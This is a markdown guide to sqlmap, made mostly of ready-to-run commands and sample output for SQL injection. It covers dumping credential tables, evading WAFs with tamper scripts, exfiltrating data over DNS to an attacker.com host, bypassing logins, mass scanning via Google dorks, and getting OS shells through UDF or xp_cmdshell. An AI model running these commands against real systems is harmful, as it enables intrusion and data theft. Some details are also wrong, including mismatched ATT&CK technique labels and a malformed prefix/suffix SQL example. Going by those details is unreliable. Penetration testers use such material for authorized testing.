# sqlmap — Hands-On Use Cases

---

## Testing a Simple GET Parameter (T1190 Exploit Public-Facing Application)

**Scenario:** A PHP application has a search page at `http://target.com/search.php?q=books`. The `q` parameter appears to be vulnerable to SQL injection based on manual testing (error messages leak database info).

**Baseline command:**
```bash
python3 sqlmap.py -u "http://target.com/search.php?q=books" --batch
```

**What happens:**
1. sqlmap injects payloads into the `q` parameter.
2. Compares responses to detect differences (boolean-based, time-based, error-based).
3. Once vulnerability is confirmed, probes for the DBMS type.
4. Exits after confirmation (no data extraction).

**Output file:** Cached session data in `.sqlmap/` directory (default: `$HOME/.sqlmap/` on Linux/macOS, `%LOCALAPPDATA%/sqlmap/` on Windows).

---

## POST Data Injection with Automatic Data Extraction (T1595 Active Scanning, T1190)

**Scenario:** A login form at `http://internal.app/login.php` accepts POST data `username=admin&password=test`. The password field is suspected to be vulnerable.

```bash
python3 sqlmap.py -u "http://internal.app/login.php" \
  --data="username=admin&password=test" \
  -p password \
  --dbs \
  --batch
```

**Flags explained:**
- `--data=` — POST body content (URL-encoded).
- `-p password` — Test only the `password` parameter (speeds up testing vs. testing both).
- `--dbs` — List all databases once vulnerability is confirmed.

**Alternative (retrieve current user and database):**
```bash
python3 sqlmap.py -u "http://internal.app/login.php" \
  --data="username=admin&password=test*" \
  --current-user \
  --current-db \
  --batch
```

Note the `*` marker: sqlmap uses `*` to denote where it should inject payloads (if omitted, it auto-detects).

---

## Cookie-Based Session Token Injection (T1199 Trusted Relationship)

**Scenario:** A session cookie `sessionid` contains a SQL injection vulnerability. The app only exposes data to authenticated users.

```bash
python3 sqlmap.py -u "http://target.com/profile.php" \
  --cookie="sessionid=1234*; other=value" \
  --banner \
  --dbs \
  --batch
```

**Note:** sqlmap will inject into the `sessionid` value (where the `*` is marked) and leave `other=value` untouched. If no `*` is specified, sqlmap tests all cookie parameters.

---

## Boolean-Based Blind SQL Injection Detection (T1046 Network Service Scanning)

**Scenario:** An API endpoint returns 200 for valid queries and 404 for false conditions, with no error messages or timing differences.

```bash
python3 sqlmap.py -u "http://api.target.com/user/123" \
  --technique=B \
  --level=2 \
  --string="username" \
  --batch
```

**Flags:**
- `--technique=B` — Use only boolean-based detection (faster if you know this is the only viable technique).
- `--string="username"` — Treat responses containing "username" as true (vulnerable). If this string is absent, the response is false.
- `--level=2` — Test beyond standard GET/POST params (includes cookies).

**What sqlmap infers:** Compares page sizes/content between injections like `AND 1=1` (string present) vs. `AND 1=2` (string absent) to confirm boolean logic.

---

## Time-Based Blind SQL Injection (T1018 Remote System Discovery)

**Scenario:** A vulnerable parameter returns identical HTML regardless of the payload, but response time varies based on SQL logic.

```bash
python3 sqlmap.py -u "http://target.com/product.php?id=1" \
  --technique=T \
  --time-sec=2 \
  --threads=1 \
  --batch
```

**Flags:**
- `--technique=T` — Use time-based blind only.
- `--time-sec=2` — Use 2-second delay when testing (default 5; lower values are faster but riskier for false positives).
- `--threads=1` — Single-threaded for stable timing measurements (multi-threading interferes with time-based detection).

**Timeline:** A single UNION query extraction might take 2-3 minutes. One-by-one bit extraction (boolean-based blind) via time delay takes hours. sqlmap will warn if this is expected.

---

## Union-Based SQL Injection with Column Guessing (T1595)

**Scenario:** The vulnerable parameter is in a SELECT statement that outputs results. sqlmap can use UNION SELECT to extract data directly.

```bash
python3 sqlmap.py -u "http://target.com/search.php?q=1" \
  --technique=U \
  --union-cols=5-15 \
  --dbs \
  --batch
```

**Flags:**
- `--technique=U` — Use union-based only (fast, but fails if the application doesn't return query results directly).
- `--union-cols=5-15` — Test column counts between 5 and 15 (reduces testing time if you have a hint).

**What happens:** sqlmap injects payloads like `1 UNION SELECT 1,2,3,4,5 -- ` incrementally until it finds the correct column count, then starts extracting data.

**If column count is known:**
```bash
python3 sqlmap.py -u "http://target.com/search.php?q=1" \
  --union-cols=7 \
  --union-char=1 \
  --dump -D myapp -T users
```

---

## Error-Based SQL Injection for Fast Data Extraction (T1595)

**Scenario:** The application returns detailed SQL error messages. Errors can be abused to leak data directly.

```bash
python3 sqlmap.py -u "http://target.com/page.php?id=1" \
  --technique=E \
  --dbs \
  --batch
```

**Flags:**
- `--technique=E` — Use error-based injection only (fastest if errors are visible).

**Example error-based payload sqlmap generates (MySQL):**
```sql
id=1 AND extractvalue(1, concat(0x7e, (SELECT version())))
```

This forces an XML parsing error and leaks the result of `version()` in the error message itself — a single HTTP request extracts complex data vs. boolean-based blind (hundreds of requests).

---

## Database Enumeration and Dump (T1040 Network Sniffing)

**Scenario:** You've confirmed SQLi and want to extract all user credentials from a known table.

**Step 1: List databases**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --dbs \
  --batch
```

Output:
```
[*] Database 1: information_schema
[*] Database 2: mysql
[*] Database 3: webapp_prod
[*] Database 4: test_db
```

**Step 2: List tables in a specific database**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --tables -D webapp_prod \
  --batch
```

Output:
```
[*] webapp_prod database tables:
| users     |
| products  |
| orders    |
| admin     |
```

**Step 3: Dump a specific table**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --dump -D webapp_prod -T users \
  --batch
```

Output:
```
Database: webapp_prod
Table: users
| id | username | password_hash      | email            |
|----|----------|-------------------|------------------|
| 1  | admin    | 8c6976e5b5410415 | admin@target.com |
| 2  | user1    | 6512bd43d9caa6e02 | user1@target.com |
```

Data is cached locally; re-run with `--flush-session` to force re-dump.

---

## WAF/IDS Evasion with Tamper Scripts (T1036 Obfuscation or Deception)

**Scenario:** A Web Application Firewall blocks simple payloads. Common tamper scripts help bypass signature detection.

**Evasion example 1: Replace spaces with comments (MySQL-compatible)**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --tamper=space2comment \
  --batch
```

sqlmap converts payloads like:
```
id=1 OR 1=1
```
to:
```
id=1/**/OR/**/1=1
```

**Evasion example 2: Multiple tamper scripts in sequence**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --tamper=charencode,between,space2comment \
  --batch
```

sqlmap applies each tamper script in order:
1. `charencode` — Encodes characters to hex or HTML entities.
2. `between` — Replaces `>` and `<` with BETWEEN/NOT BETWEEN SQL keywords.
3. `space2comment` — Replaces spaces with `/* */`.

**All 76 built-in tamper scripts (partial list):**
- `space2comment`, `space2plus`, `space2dash`, `space2mssqlblank`, `space2mysqlblank`
- `charencode`, `chardoubleencode`, `charunicodeencode`
- `between`, `appendnullbyte`, `base64encode`
- `modsecurity`, `bluecoat`, `cheatsheetsql` (WAF-specific)
- `randomcase`, `removecomments`, `plus2like`

**Custom tamper script (if needed):** Users can write Python tamper scripts in `tamper/` directory; sqlmap auto-loads them.

---

## Out-of-Band Exfiltration via DNS (T1020 Automated Exfiltration)

**Scenario:** The application is on an isolated network, but the database server has outbound DNS access. You want to exfiltrate data via DNS queries rather than HTTP responses.

**Setup 1: Using Interactsh (zero-setup, recommended)**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --dns-domain=interactsh \
  --dbs \
  --batch
```

sqlmap automatically creates a temporary Interactsh session and extracts data by encoding it into DNS queries (e.g., `data_here.interactsh.com`). You retrieve results from the Interactsh dashboard.

**Setup 2: Using a custom DNS server**

First, set up a DNS server that logs all queries (e.g., Burp Collaborator, a dedicated DNS log server, or even a quick Python DNS logger):

```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --dns-domain=attacker.com \
  --dbs \
  --batch
```

sqlmap injects payloads like:
```sql
id=1; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\\\share'))
```

This triggers a DNS lookup for `[database_user].attacker.com`, leaking the user via DNS logs.

**Advantages:**
- Works even if HTTP responses are blocked/firewalled.
- Extracts large datasets without relying on HTTP response size limits.

**Disadvantages:**
- Requires DBMS outbound DNS capability (most do; some networks block).
- Data encoding/decoding is lossy (DNS has length limits; large data is chunked).

---

## Authentication Bypass via Login Form (T1110 Brute Force — SQL Injection Variant)

**Scenario:** A login form at `http://target.com/login.php` is vulnerable. You don't have credentials, but the SQL query is injectable.

```bash
python3 sqlmap.py -u "http://target.com/login.php" \
  --data="username=admin*&password=test" \
  --string="Welcome\|dashboard\|logout" \
  --batch
```

**Flags:**
- `--data=username=admin*&password=test` — Inject into `username` (marked with `*`).
- `--string="Welcome|dashboard|logout"` — Match any of these strings to indicate successful authentication (presence = true, absence = false).

**Payload example:**
```
username=admin' OR '1'='1
password=test
```

If the backend query is:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='test'
```

This bypasses the password check (the `'1'='1'` is always true).

**Output:** Once bypass is confirmed, sqlmap flags it as vulnerable and may prompt for further enumeration (`--dbs`, `--tables`, etc.).

---

## Direct Database Connection (No HTTP) (T1021 Remote Services)

**Scenario:** You've already compromised the target network and have direct network access to the database server (e.g., via a proxied pivot). You don't need to go through HTTP anymore.

```bash
python3 sqlmap.py -d "mysql://root:password@192.168.1.100:3306/mydb" \
  --dbs \
  --batch
```

**Connection string formats (DBMS-specific):**
- MySQL: `mysql://user:pass@host:port/database`
- PostgreSQL: `postgresql://user:pass@host:port/database`
- MSSQL: `mssql://user:pass@host:port/database` (or `mssqlms` for native client)
- Oracle: `oracle://user:pass@host:1521/database`
- SQLite: `sqlite:///path/to/database.db`

**Advantages:**
- Bypasses web-tier filters/WAF completely.
- Direct database queries are faster.
- Useful post-compromise for data extraction.

---

## Batch Scanning with Google Dork (T1595 Passive Information Gathering)

**Scenario:** You want to scan multiple vulnerable endpoints automatically using a Google dork query.

```bash
python3 sqlmap.py -g "inurl:php?id=" \
  -o \
  --batch
```

**Flags:**
- `-g "inurl:php?id="` — Google dork search term (returns results from Google Search).
- `-o` — Enable all optimization switches (fast but risky).
- `--batch` — Automatic mode; never prompt.

**Limitations:**
- Google rate-limits automated queries; sqlmap may hit this limit.
- Results are limited (Google returns ~100-1000 results per dork, depending on specificity).
- **Legal/Ethical consideration:** Ensure you have authorization to scan discovered targets.

---

## Session Resumption and Incremental Testing (T1592 Gather Victim Web Application Information)

**Scenario:** A large website has 50+ parameters. A full scan takes 2 hours. Your connection drops after 1 hour; you want to resume from where you left off.

**Initial scan:**
```bash
python3 sqlmap.py -u "http://target.com/page.php?id=1&cat=2&sort=3&..." \
  --level=3 \
  --risk=2 \
  --batch
  # Scan runs for 1 hour, then connection drops...
```

**Resume from cached session:**
```bash
python3 sqlmap.py -u "http://target.com/page.php?id=1&cat=2&sort=3&..." \
  --level=3 \
  --risk=2 \
  --batch
  # sqlmap detects the existing session cache and resumes from where it stopped
```

sqlmap automatically detects the URL and uses the cached session (stored in `.sqlmap/`). No need for manual commands; just re-run the same command.

**To force a fresh scan (discard cache):**
```bash
python3 sqlmap.py -u "http://target.com/..." \
  --flush-session \
  --batch
```

`--flush-session` deletes the cached data for this URL and starts over.

---

## CSRF Token Handling During Testing (T1592)

**Scenario:** The application uses anti-CSRF tokens that change on every page load. Manual token extraction would slow testing; sqlmap can auto-handle this.

```bash
python3 sqlmap.py -u "http://target.com/action.php" \
  --data="csrf_token=token123&id=1*" \
  --csrf-token=csrf_token \
  --csrf-url="http://target.com/form.php" \
  --csrf-retries=2 \
  --batch
```

**Flags:**
- `--csrf-token=csrf_token` — Name of the CSRF token parameter (sqlmap will extract and update this automatically).
- `--csrf-url=` — URL to fetch a fresh CSRF token from before each request.
- `--csrf-retries=2` — Retry token extraction up to 2 times if it fails.

**What happens:**
1. sqlmap visits `--csrf-url` and extracts the latest CSRF token value.
2. Injects it into the `--csrf-token` parameter of your POST data.
3. Repeats before each request to keep the token fresh.

---

## Prefix/Suffix Injection for Context Escaping (T1036)

**Scenario:** The vulnerable parameter is embedded inside a SQL string. Example: The query is `SELECT * FROM users WHERE name='USERINPUT'`.

You need to escape the string context first:

```bash
python3 sqlmap.py -u "http://target.com/search?name=test" \
  --prefix="' OR '" \
  --suffix="' -- " \
  --batch
```

**Generated payload:**
```
name=' OR '' OR '
```

Which results in the final SQL query:
```sql
SELECT * FROM users WHERE name='' OR '' OR '''
```

The `'` closes the string context, `OR ''` adds a true condition, and the final `' -- ` comments out the rest.

---

## Fingerprinting and Database Identification (T1592)

**Scenario:** You've detected a SQLi but aren't sure which DBMS it is. Deep fingerprinting helps identify specific version details.

**Quick fingerprint:**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --banner \
  --batch
```

Output:
```
[*] MySQL 5.7.35
```

**Deep fingerprint:**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --fingerprint \
  --batch
```

Output:
```
[*] Database: MySQL 5.7.35 (Linux)
[*] User: appuser@localhost
[*] Privileges: FILE, PROCESS, RELOAD, REPLICATION SLAVE, REPLICATION CLIENT
[*] Characters: latin1_swedish_ci
```

The `-f` flag queries DBMS-specific info variables (`@@version`, `@@datadir`, privilege info, etc.) to build a detailed profile. Useful for planning exploitation (e.g., "This MySQL has FILE privilege, so we can write a webshell").

---

## Interactive SQL Shell (T1021)

**Scenario:** Once SQLi is confirmed, you want to execute arbitrary SQL queries interactively.

```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --sql-shell \
  --batch
```

**Interactive prompt:**
```
sql-shell>
```

**Example queries:**
```sql
sql-shell> SELECT USER(), DATABASE()
[*] MySQL retrieved: 'appuser@localhost', 'webapp_prod'

sql-shell> SELECT GROUP_CONCAT(user, 0x3a, password) FROM users LIMIT 1
[*] MySQL retrieved: 'admin:8c6976e5b5410415,...'

sql-shell> SHOW VARIABLES LIKE 'secure_file_priv'
[*] MySQL retrieved: 'secure_file_priv', ''
```

The shell executes queries via the injection point and returns results. Useful for reconnaissance, but slower than batch queries (`--dump`, `--dbs`) for large data extraction.

---

## OS Command Execution via Database UDF (T1190, T1021)

**Scenario:** The database has high privileges and allows loading user-defined functions (UDFs) or executing OS commands directly.

**For MySQL (if `secure_file_priv` is empty):**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --os-shell \
  --batch
```

sqlmap attempts to:
1. Write a webshell or UDF binary to the filesystem (if file-write is possible).
2. Load the UDF into MySQL via `CREATE FUNCTION`.
3. Execute OS commands via the UDF.

**For MSSQL (via xp_cmdshell):**
```bash
python3 sqlmap.py -u "http://target.com/id=1" \
  --dbms=MSSQL \
  --os-shell \
  --batch
```

sqlmap attempts to enable `xp_cmdshell` and execute OS commands.

**Prompt:**
```
os-shell>
c:\> whoami
nt authority\system
```

**Prerequisites:**
- Database must have OS command execution capability (MySQL needs `secure_file_priv` empty and UDF loading enabled; MSSQL needs `xp_cmdshell` enabled or enable-able).
- Database user must have FILE privilege (MySQL) or admin privilege (MSSQL).
- Extremely loud: OS command execution logs heavily in most DBMSes.

---

## Second-Order SQL Injection Testing (T1598 Phishing for Information)

**Scenario:** The payload isn't reflected immediately; it's stored and executed later (e.g., stored in a database and displayed on an admin panel).

```bash
python3 sqlmap.py -u "http://target.com/profile.php?user=test" \
  --data="bio=mytext*" \
  --second-url="http://target.com/admin/view_profile.php?user=test" \
  --batch
```

**Flags:**
- `--second-url=` — Where to check for the second-order payload reflection (payload injected in `bio`, checked in the admin view).

**How it works:**
1. First request injects the payload into the `bio` parameter.
2. Application stores the payload in the database.
3. Second request fetches `--second-url` and checks if the payload is reflected there.
4. If reflection occurs, it's confirmed as second-order SQLi.

